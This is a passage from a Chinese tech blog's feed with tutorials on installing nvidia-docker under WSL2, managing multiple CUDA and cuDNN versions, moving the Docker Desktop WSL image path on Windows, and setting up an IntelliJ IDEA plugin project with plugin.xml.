        <content type="html"><![CDATA[<h2 id="安装-nvidia-docker"><a href="#安装-nvidia-docker" class="headerlink" title="安装 nvidia-docker"></a>安装 nvidia-docker</h2><h3 id="开始安装-NVIDIA-Container-Toolkit"><a href="#开始安装-NVIDIA-Container-Toolkit" class="headerlink" title="开始安装 NVIDIA Container Toolkit"></a>开始安装 NVIDIA Container Toolkit</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">distribution</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">.</span> /etc/os-release<span class="token punctuation">;</span><span class="token builtin class-name">echo</span> $ID$VERSION_ID<span class="token variable">)</span></span> <span class="token punctuation">\</span>   <span class="token operator">&amp;&amp;</span> <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-L</span> https://nvidia.github.io/nvidia-docker/gpgkey <span class="token operator">|</span> <span class="token function">sudo</span> apt-key <span class="token function">add</span> - <span class="token punctuation">\</span>   <span class="token operator">&amp;&amp;</span> <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-L</span> https://nvidia.github.io/nvidia-docker/<span class="token variable">$distribution</span>/nvidia-docker.list <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/nvidia-docker.list<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="启用实验性功能-CUDA-on-WSL-or-MIG-capability"><a href="#启用实验性功能-CUDA-on-WSL-or-MIG-capability" class="headerlink" title="启用实验性功能(CUDA on WSL or MIG capability)"></a>启用实验性功能(CUDA on WSL or MIG capability)</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-L</span> https://nvidia.github.io/nvidia-container-runtime/experimental/<span class="token variable">$distribution</span>/nvidia-container-runtime.list <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /etc/apt/sources.list.d/nvidia-container-runtime.list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="安装-nvidia-docker2"><a href="#安装-nvidia-docker2" class="headerlink" title="安装 nvidia-docker2"></a>安装 nvidia-docker2</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> update<span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> nvidia-docker2<span class="token comment"># 重启 docker</span><span class="token comment"># sudo systemctl restart docker</span><span class="token comment"># WSL2</span><span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">docker</span> stop<span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">docker</span> start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="测试-nvidia-docker2-是否安装成功-中间可能需要重启"><a href="#测试-nvidia-docker2-是否安装成功-中间可能需要重启" class="headerlink" title="测试 nvidia-docker2 是否安装成功, 中间可能需要重启"></a>测试 nvidia-docker2 是否安装成功, 中间可能需要重启</h3><p>创建 Docker 容器时添加 <code>--gpus all</code> 参数启用 GPU</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">docker</span> run <span class="token parameter variable">--rm</span> <span class="token parameter variable">--gpus</span> all nvidia/cuda:11.0-base nvidia-smi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 显卡 </tag>
            
            <tag> 容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>多版本 CUDA 及 cuDNN 管理</title>
      <link href="/2022/09/22/multipleversionsnivdiamanage/"/>
      <url>/2022/09/22/multipleversionsnivdiamanage/</url>
      
        <content type="html"><![CDATA[<h2 id="多版本-CUDA-及-cuDNN-管理"><a href="#多版本-CUDA-及-cuDNN-管理" class="headerlink" title="多版本 CUDA 及 cuDNN 管理"></a>多版本 CUDA 及 cuDNN 管理</h2><h3 id="Install-CUDA"><a href="#Install-CUDA" class="headerlink" title="Install CUDA"></a>Install CUDA</h3><p>安装 CUDA 比较快，直接从 <a href="https://developer.nvidia.com/cuda-toolkit-archive">NVIDIA 官网</a>下载 <code>runfile</code> 的版本，并按照它上面的指令输入进行安装</p><p>这里有两点很重要需要注意：</p><blockquote><p>添加 <code>--override</code> 参数可以忽略 <code>Failed to verify gcc version.</code>. 但是可能有兼容问题</p><p>不用从 CUDA-toolkit 里安装驱动，请手动去安装最新的驱动</p><p>安装时，请不要选择建立 <code>symbolic link</code></p></blockquote><p>以 11.2.2 为例</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> https://developer.download.nvidia.com/compute/cuda/11.2.2/local_installers/cuda_11.2.2_460.32.03_linux.run<span class="token function">sudo</span> <span class="token function">sh</span> cuda_11.2.2_460.32.03_linux.run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>取消勾选驱动</p><pre class="line-numbers language-none"><code class="language-none">CUDA Installer  [ ] Driver+ [X] CUDA Toolkit 11.2  [X] CUDA Samples 11.2  [X] CUDA Demo Suite 11.2    [X] CUDA Documentation 11.2  Options  Install<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>按 <code>A</code> 显示高级选项, 取消建立 <code>symbolic link</code></p><pre class="line-numbers language-none"><code class="language-none">CUDA Toolkit  Change Toolkit Install Path  [ ] Create symbolic link from /usr/local/cuda- [ ] Create desktop menu shortcuts     [ ] All users     [ ] Yes     [ ] No  [X] Install manpage documents to /usr/share/man  Done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>选择 <code>Install</code> 完成安装, 就会输出 Summary</p><pre class="line-numbers language-none"><code class="language-none">============ Summary ============Driver:   Not SelectedToolkit:  Installed in /usr/local/cuda-11.2/Samples:  Installed in /home/crazybun/, but missing recommended librariesPlease make sure that -   PATH includes /usr/local/cuda-11.2/bin -   LD_LIBRARY_PATH includes /usr/local/cuda-11.2/lib64, or, add /usr/local/cuda-11.2/lib64 to /etc/ld.so.conf and run ldconfig as rootTo uninstall the CUDA Toolkit, run cuda-uninstaller in /usr/local/cuda-11.2/bin***WARNING: Incomplete installation! This installation did not install the CUDA Driver. A driver of version at least 460.00 is required for CUDA 11.2 functionality to work.To install the driver using this installer, run the following command, replacing &lt;CudaInstaller&gt; with the name of this run file:    sudo &lt;CudaInstaller&gt;.run --silent --driverLogfile is /var/log/cuda-installer.log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Install-cuDNN"><a href="#Install-cuDNN" class="headerlink" title="Install cuDNN"></a>Install cuDNN</h3><p>从 NVIDIA 官网下载<a href="https://developer.nvidia.com/rdp/cudnn-archive">对应 CUDA 版本的 cuDNN</a></p><blockquote><p>下载时可能需要登录</p></blockquote><p>然后用 <code>tar -xvf &lt;CUDNN_ZIP_NAME&gt;</code> 解压缩</p><p>执行查看目录结构</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ tree <span class="token parameter variable">-L</span> <span class="token number">2</span> ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>内容大概长这样:</p><pre class="line-numbers language-none"><code class="language-none">./└── cuda    ├── NVIDIA_SLA_cuDNN_Support.txt    ├── include    └── lib643 directories, 1 file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在 cuda 同级目录下创建 <code>cudnn_install.sh</code> 新增脚本, 并写入下面内容</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">read</span> <span class="token parameter variable">-p</span> <span class="token string">"CUDA-version: "</span> ver<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token string">"/usr/local/cuda-<span class="token variable">${ver}</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>  <span class="token builtin class-name">echo</span> <span class="token string">"create dir: /usr/local/cuda-<span class="token variable">${ver}</span>"</span>  <span class="token function">mkdir</span> <span class="token string">"/usr/local/cuda-<span class="token variable">${ver}</span>"</span>  <span class="token builtin class-name">echo</span> <span class="token string">"create dir: /usr/local/cuda-<span class="token variable">${ver}</span>/include"</span>  <span class="token function">mkdir</span> <span class="token string">"/usr/local/cuda-<span class="token variable">${ver}</span>/include"</span>  <span class="token builtin class-name">echo</span> <span class="token string">"create dir: /usr/local/cuda-<span class="token variable">${ver}</span>/lib64"</span>  <span class="token function">mkdir</span> <span class="token string">"/usr/local/cuda-<span class="token variable">${ver}</span>/lib64"</span><span class="token keyword">fi</span><span class="token function">cp</span> cuda/include/cudnn.h /usr/local/cuda-<span class="token string">"<span class="token variable">${ver}</span>"</span>/include<span class="token function">cp</span> cuda/lib64/libcudnn* /usr/local/cuda-<span class="token string">"<span class="token variable">${ver}</span>"</span>/lib64<span class="token function">chmod</span> a+r /usr/local/cuda*/include/cudnn.h /usr/local/cuda*/lib64/libcudnn*<span class="token builtin class-name">echo</span> includetree <span class="token parameter variable">-L</span> <span class="token number">1</span> /usr/local/cuda-<span class="token string">"<span class="token variable">${ver}</span>"</span>/include <span class="token operator">|</span> <span class="token function">grep</span> cudnn<span class="token builtin class-name">echo</span> lib64tree <span class="token parameter variable">-L</span> <span class="token number">1</span> /usr/local/cuda-<span class="token string">"<span class="token variable">${ver}</span>"</span>/lib64 <span class="token operator">|</span> <span class="token function">grep</span> cudnn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>目录结构如下:</p><pre class="line-numbers language-none"><code class="language-none">./├── cuda│ ├── NVIDIA_SLA_cuDNN_Support.txt│ ├── include│ └── lib64└── cudnn_install.sh3 directories, 2 files<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个脚本时自动把 cuDNN 复制到 CUDA 目录下(为什么 cuDNN 跟 CUDA 要分开下载呢…)</p><p>更改脚本权限并执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x cudnn_install.sh <span class="token operator">&amp;</span> <span class="token function">sudo</span> ./cudnn_install.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，在 <code>~/.bashrc</code> 或 <code>~/.zshrc</code> 中添加切换 CUDA 版本的函数，方便以后直接调用函数切换 CUDA 版本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># add below to your env bash file.</span><span class="token keyword">function</span> <span class="token function-name function">_switch_cuda</span> <span class="token punctuation">{</span>   <span class="token assign-left variable">v</span><span class="token operator">=</span><span class="token variable">$1</span>   <span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token environment constant">$PATH</span>:/usr/local/cuda-<span class="token variable">$v</span>/bin   <span class="token builtin class-name">export</span> <span class="token assign-left variable">CUDADIR</span><span class="token operator">=</span>/usr/local/cuda-<span class="token variable">$v</span>   <span class="token builtin class-name">export</span> <span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span><span class="token variable">$LD_LIBRARY_PATH</span>:/usr/local/cuda-<span class="token variable">$v</span>/lib64   nvcc <span class="token parameter variable">--version</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>记得 <code>source</code> 一下</p></blockquote><p>之后只要在命令行中输入 <code>_switch_cuda 11.2</code> 就会自动切换 CUDA 版本到 11.2 了</p><h4 id="查看-CUDA-版本与-cuDNN-版本"><a href="#查看-CUDA-版本与-cuDNN-版本" class="headerlink" title="查看 CUDA 版本与 cuDNN 版本"></a>查看 CUDA 版本与 cuDNN 版本</h4><p>执行 <code>nvcc --version</code> 查看 CUDA 版本:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ nvcc: NVIDIA <span class="token punctuation">(</span>R<span class="token punctuation">)</span> Cuda compiler driverCopyright <span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token number">2005</span>-2021 NVIDIA CorporationBuilt on Sun_Feb_14_21:12:58_PST_2021Cuda compilation tools, release <span class="token number">11.2</span>, V11.2.152Build cuda_11.2.r11.2/compiler.29618528_0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>查看 cuDNN 版本</p><p>先查找 cudnn 版本信息文件位置:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">whereis</span> cudnn_version<span class="token comment"># cudnn_version: /usr/include/cudnn_version.h</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>查看大版本号和小版本号</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/include/cudnn_version.h <span class="token operator">|</span> <span class="token function">grep</span> CUDNN_MAJOR<span class="token comment">#define CUDNN_MAJOR 8</span><span class="token function">cat</span> /usr/include/cudnn_version.h <span class="token operator">|</span> <span class="token function">grep</span> CUDNN_MINOR<span class="token comment">#define CUDNN_MINOR 1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>所以这里的 cuDNN 版本为 8.1</p><h4 id="nvcc-和-nvidia-smi-显示的版本不一致？"><a href="#nvcc-和-nvidia-smi-显示的版本不一致？" class="headerlink" title="nvcc 和 nvidia-smi 显示的版本不一致？"></a><code>nvcc</code> 和 <code>nvidia-smi</code> 显示的版本不一致？</h4><ul><li>nvcc 属于 CUDA 的编译器，将程序编译成可执行的二进制文件; nvidia-smi(NVIDIA System Management Interface) 是一种命令行实用工具，旨在帮助管理和监控 NVIDIA GPU 设备</li><li>CUDA 有 runtime api 和 driver api，两者都有对应的 CUDA 版本. <code>nvcc --version</code> 显示的就是前者对应的 CUDA 版本, 而 <code>nvidia-smi</code> 显示的是后者对应的 CUDA 版本</li><li>用于支持 driver api 的必要文件由 GPU driver installer 安装, <code>nvidia-smi</code> 就属于这一类 API; 而用于支持 runtime api 的必要文件是由 CUDA Toolkit installer 安装的。nvcc 是与 CUDA Toolkit 一起安装的 CUDA compiler-driver tool，它只知道它自身构建时的 CUDA runtime 版本，并不知道安装了什么版本的 GPU driver，甚至不知道是否安装了 GPU driver</li></ul><p>CUDA Toolkit Installer 通常会集成了 GPU Driver Installer，如果你的 CUDA 均通过 CUDA Toolkit Installer 来安装</p><p>那么 runtime api 和 driver api 的版本应该是一致的，也就是说, <code>nvcc --version</code> 和 <code>nvidia-smi</code> 显示的版本应该一样</p><p>因为我们自行安装了最新的的 GPU 驱动, 这样就会导致 <code>nvidia-smi</code> 和 <code>nvcc --version</code> 显示的版本不一致了</p><p><strong>通常, driver api 的版本能向下兼容 runtime api 的版本，即 <code>nvidia-smi</code> 显示的版本大于 <code>nvcc --version</code> 的版本通常不会出现问题</strong></p>]]></content>
      
      
      <categories>
          
          <category> 机器学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nvidia </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows 下修改 Docker 镜像路径</title>
      <link href="/2022/08/22/dockercontainerpath/"/>
      <url>/2022/08/22/dockercontainerpath/</url>
      
        <content type="html"><![CDATA[<h2 id="Windows-下修改使用-WSL-的-Docker-镜像路径"><a href="#Windows-下修改使用-WSL-的-Docker-镜像路径" class="headerlink" title="Windows 下修改使用 WSL 的 Docker 镜像路径"></a>Windows 下修改使用 WSL 的 Docker 镜像路径</h2><p>配置 Docker 使用 WSL 2 后，默认的镜像存放路径是 <code>C:\Users\&lt;用户名&gt;\AppData\Local\Docker\wsl\data\ext4.vhdx</code></p><p>要修改镜像路径，原理就是使用 <code>wsl</code> 命令重新指定 <code>Docker</code> 使用的数据路径。</p><p>首先如果启动了 Docker Desktop 的话，要先在系统托盘中右键 Docker Desktop 的图标，点击退出 Docker Desktop。</p><p>在命令行窗口中执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wsl <span class="token parameter variable">--list</span> <span class="token parameter variable">-v</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>要确保输出列表中 <code>docker-desktop</code> 和 <code>docker-desktop-data</code> 的 <code>STATE</code> 列均为 <code>Stopped</code>。即：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">  NAME                   STATE           VERSION* Ubuntu                 Stopped         <span class="token number">2</span>  docker-desktop         Stopped         <span class="token number">2</span>  docker-desktop-data    Stopped         <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来是将当前 <code>docker-desktop-data</code> 备份出来，以便后面更换路径时还原当前的 Docker 数据。我要将 Docker 镜像路径迁移到 <code>D:\Docker\wsl\data</code> 目录下，首先要自己手动创建这些目录（否则执行 <code>wsl --export</code> 时会提示路径不存在），然后执行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wsl <span class="token parameter variable">--export</span> docker-desktop-data <span class="token string">"G:\Docker\wsl\data\docker-desktop-data.tar"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>wsl</code> 命令会将 <code>docker-desktop-data</code> 的数据输出到指定路径中。其实这里的路径是任意路径也可以，真正指定新的镜像路径是在后面的注册命令中，此处为了演示方便将备份文件也输出到新的镜像路径中。</p><p>接下来要将原来的 <code>docker-desktop-data</code> 解除注册，注意执行解除注册命令后，<code>docker-desktop-data</code> 原来的数据文件会被删除，因此要恢复的话一定要提前按照前面的步骤备份数据文件。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wsl <span class="token parameter variable">--unregister</span> docker-desktop-data<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后重新注册 <code>docker-desktop-data</code>，指定它的路径为新路径，并将原来备份的文件恢复：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wsl <span class="token parameter variable">--import</span> docker-desktop-data <span class="token string">"G:\Docker\wsl\data"</span> <span class="token string">"G:\Docker\wsl\data\docker-desktop-data.tar"</span> <span class="token parameter variable">--version</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>此处 <code>--version</code> 的值应该和前面 <code>wsl --list -v</code> 输出中对应 <code>VERSION</code> 列的值一致。恢复后原备份文件可删除。</p><p>执行完成后重新启动 Docker Desktop，Docker 的镜像路径已经更改到了新目录中。</p><p>注意不要重新注册 <code>docker-desktop</code>，重新注册的话会将 <code>docker-desktop-data</code> 的路径重新设置回默认目录中，因此只需要按照上面的步骤重新注册 <code>docker-desktop-data</code> 即可。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 显卡 </tag>
            
            <tag> 容器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDEA 插件开发入门</title>
      <link href="/2022/07/22/ideaplugindevelop/"/>
      <url>/2022/07/22/ideaplugindevelop/</url>
      
        <content type="html"><![CDATA[<p>一直想开发自己的插件来着，正好工作中有机会了，研究研究~</p><span id="more"></span><h2 id="开发环境搭建"><a href="#开发环境搭建" class="headerlink" title="开发环境搭建"></a>开发环境搭建</h2><h3 id="开发工具"><a href="#开发工具" class="headerlink" title="开发工具"></a>开发工具</h3><p>所有 JetBrains 旗下的集成开发工具插件都通过 <a href="https://www.jetbrains.com/idea/">IntelliJ IDEA</a> 进行开发</p><p>IntelliJ IDEA 分为两个版本:</p><ul><li>社区版(Community): 完全免费，代码开源，但是缺少一些旗舰版中的高级特性</li><li>旗舰版(Ultimate): 30 天免费，支持全部功能，代码不开源，学生有打折</li></ul><p>在开发插件的过程中，不管你用的哪个版本的 IDEA，都会自动下载社区版源代码进行调试的</p><h3 id="启用-Plugin-DevKit"><a href="#启用-Plugin-DevKit" class="headerlink" title="启用 Plugin DevKit"></a>启用 Plugin DevKit</h3><p>Plugin DevKit 本身就是 IntelliJ 的一个插件，它使用 IntelliJ IDEA 自己的构建系统来为开发 IDEA 插件提供插件开发的支持, 所以开发 IDEA 插件之前需要先安装并启用 Plugin DevKit</p><p><img src="/images/IDEAEnablePluginDevKit.png" alt="Enable Plugin DevKit"></p><h3 id="配置插件开发工具包"><a href="#配置插件开发工具包" class="headerlink" title="配置插件开发工具包"></a>配置插件开发工具包</h3><blockquote><p>这里默认大家都已经安了 JDK 并且添加到 IDEA 中了…没有的话安装与添加方式与本节一致</p></blockquote><p>IntelliJ Platform Plugin SDK 就是开发 IntelliJ 平台插件的开发工具包, 是基于 JDK 之上运行的, 类似于开发 Java 应用需要 JDK(Java SDK), 开发 Android 应用需要 Android SDK</p><p>这里添加方式跟添加 JDK 一样, 打开项目结构设置，在全局 SDK 中添加 IntelliJ Platform Plugin SDK，就是你本地 IDEA 安装目录，其他设置默认即可</p><p><img src="/images/IDEAAddPluginSDK.png" alt="Add IntelliJ Platform Plugin SDK"></p><p>这里会比添加 JDK 多一个沙盒主页，默认就星，在调试插件时启动的 IDEA 就是运行在这里的，不会影响当前的 IntelliJ IDEA</p><p>但是同一台机器同时开发多个插件时默认使用的同一个沙盒，即在创建 IntelliJ Platform SDK 时默认指定的沙盒主页</p><h2 id="创建插件项目"><a href="#创建插件项目" class="headerlink" title="创建插件项目"></a>创建插件项目</h2><p>搞定开发环境之后，新建项目时选择 IDE 插件，设置项目信息后点击确定就会打开新的项目窗口</p><p><img src="/images/IDEACreatePluginProject.png"></p><h3 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h3><p>项目打开后, 项目结构如下，还是我们很熟悉的项目结构</p><p><img src="/images/IDEAPluginProjectStructure.png"></p><p>开发过程中，我们主要关注以下内容:</p><ul><li>src: 源码和资源目录<ul><li>源码在 /main/java 下面</li><li>资源文件在 /main/resources 下面, 其中在 META-INF 中已经创建了两个文件<ul><li>plugin.xml: 插件配置文件，开发过程中各种插件相关配置都在这里面，后面会详细说明</li><li>pluginIcon.svg: 插件图标文件，这是自动创建的默认图标，我们可以自行更改</li></ul></li><li>如果需要写单元测试，跟往常一样，可以在 src 创建 main 的同级目录 /test/java 放入测试代码和测试资源</li></ul></li><li>build.gradle.kts: 类似 Maven 项目的 pom.xml 文件，是项目的依赖与编译等配置</li><li>settings.gradle.kts: 项目属性，例如项目名称和自定义依赖仓库地址设置在这里，一般不需要改动</li></ul><p>其他文件不需要修改</p><h3 id="依赖下载及项目构建"><a href="#依赖下载及项目构建" class="headerlink" title="依赖下载及项目构建"></a>依赖下载及项目构建</h3><p>跟 Maven 项目很像, 侧边栏也会有个 Gradle 栏</p><p><img src="/images/IDEAPluginGradle.png"></p><p>并且会像 Maven 项目一样，点击刷新按钮自动下载依赖，并且包括 IDEA 社区版及其源码, 很方便</p><p><img src="/images/IDEADownloadIC.png"><br><img src="/images/IDEADownloadICSrc.png"><br><img src="/images/IDEAPluginDownloadDependency.png"></p><h3 id="插件配置"><a href="#插件配置" class="headerlink" title="插件配置"></a>插件配置</h3><p>下面是 plugin.xml 配置的主要元素</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- 插件配置文件。阅读更多: https://plugins.jetbrains.com/docs/intellij/plugin-configuration-file.html --&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>idea-plugin</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 插件唯一id，不能和其他插件项目重复，所以推荐使用 com.xxx.xxx 的格式       插件不同版本之间不能更改，若没有指定，则与插件名称相同 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>id</span><span class="token punctuation">&gt;</span></span>com.example.demo1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>id</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 插件名称，别人在官方插件库搜索你的插件时使用的名称 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">&gt;</span></span>Demo1<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 供应商主页和 email, 就是告诉用户作者是谁，万一有人给你打赏呢 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>vendor</span> <span class="token attr-name">url</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://www.jetbrains.com<span class="token punctuation">"</span></span> <span class="token attr-name">email</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>support@jetbrains.com<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  <span class="token comment">&lt;!-- 插件页面和 IDE 插件管理器上显示的插件说明。可以在 &lt;![CDATA[ ]]&gt; 标记内添加简单的 HTML 元素（文本格式、段落和列表）。       Guidelines: https://plugins.jetbrains.com/docs/marketplace/plugin-overview-page.html#plugin-description --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>description</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[    在此处输入您的插件的简短描述。&lt;br&gt;    &lt;em&gt;大多数 HTML 标签都可以使用&lt;/em&gt;  ]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>description</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 产品和插件兼容性要求, 就是插件所依赖的其他插件的 id. 注意，是插件，不是依赖包       Read more: https://plugins.jetbrains.com/docs/intellij/plugin-compatibility.html --&gt;</span>  <span class="token comment">&lt;!-- 请参阅 http:www.jetbrains.orgintellijsdkdocsbasicsgetting_startedplugin_compatibility.html 了解如何针对不同的产品 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>depends</span><span class="token punctuation">&gt;</span></span>com.intellij.modules.platform<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>depends</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 插件定义的扩展点, 声明该插件对 IDEA core 或其他插件的扩展       Read more: https://plugins.jetbrains.com/docs/intellij/plugin-extension-points.html --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>extensions</span> <span class="token attr-name">defaultExtensionNs</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.intellij<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>extensions</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 以上是创建项目时默认创建的配置, 下面时可以额外进行添加的配置 --&gt;</span>  <span class="token comment">&lt;!-- 插件版本变更信息，支持HTML标签；可以在 &lt;![CDATA[ ]]&gt; 标记内添加简单的 HTML 元素（文本格式、段落和列表）。       将展示在 settings | Plugins 对话框和插件仓库的Web页面 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>change-notes</span><span class="token punctuation">&gt;</span></span>Initial release of the plugin.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>change-notes</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 插件版本 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">&gt;</span></span>1.0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">&gt;</span></span>  <span class="token comment">&lt;!-- 插件兼容 IDEA 的最大和最小 build 号，两个属性可以任选一个或者同时使用       官网详细介绍：http://www.jetbrains.org/intellij/sdk/docs/basics/getting_started/build_number_ranges.html--&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>idea-version</span> <span class="token attr-name">since-build</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3000<span class="token punctuation">"</span></span> <span class="token attr-name">until-build</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>3999<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>  <span class="token comment">&lt;!-- 应用级组件声明 --&gt;</span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>application-components</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>component</span><span class="token punctuation">&gt;</span></span>      <span class="token comment">&lt;!-- 组件接口 --&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>interface-class</span><span class="token punctuation">&gt;</span></span>com.foo.Component1Interface<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>interface-class</span><span class="token punctuation">&gt;</span></span>      <span class="token comment">&lt;!-- 组件的实现类 --&gt;</span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>implementation-class</span><span class="token punctuation">&gt;</span></span>com.foo.impl.Component1Impl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>implementation-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span 